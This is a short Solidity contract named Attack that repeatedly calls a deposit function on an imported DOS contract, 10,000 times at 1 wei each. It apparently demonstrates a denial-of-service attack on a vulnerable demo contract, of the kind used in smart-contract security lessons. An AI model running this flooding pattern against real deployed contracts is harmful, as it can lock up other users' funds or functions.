// SPDX-License-Identifier: GPL-3.0
pragma solidity >=0.5.0 <0.9.0;
import "./DOS.sol";

contract Attack {
  DOS public dos;

  constructor(DOS _address){
      dos=_address;
  }
  
  function sendEthContract() public payable{

  }
  function attack() public {
     uint counter;
     while(counter<10000){
      dos.deposit{value:1 wei}();
      counter++;
     }
     
  }
}